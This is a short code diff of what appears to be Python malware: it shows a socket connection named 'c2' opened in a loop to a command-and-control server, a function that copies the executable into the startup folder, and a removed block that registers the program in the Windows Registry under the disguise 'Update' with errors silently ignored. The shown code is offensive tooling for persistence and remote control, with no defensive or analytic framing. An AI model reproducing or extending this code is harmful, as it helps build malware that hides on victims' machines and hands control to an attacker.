@@ -1,5 +1,4 @@
 import socket, threading, time, random, struct, os, sys, ssl
-import winreg as reg
 import shutil
 try:
     import requests 
@@ -533,15 +532,6 @@ def create_shortcut_to_startup():
     shutil.copy(exe_path, shortcut_path)
 
 def main():
-        
-        try:
-            program_name = "Update"  # Tên bạn muốn hiển thị trong Registry
-            path_to_exe = os.path.abspath(sys.argv[0])
-            add_to_startup(program_name, path_to_exe)
-            #create_shortcut_to_startup()
-        except:
-            pass
-
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         while 1:
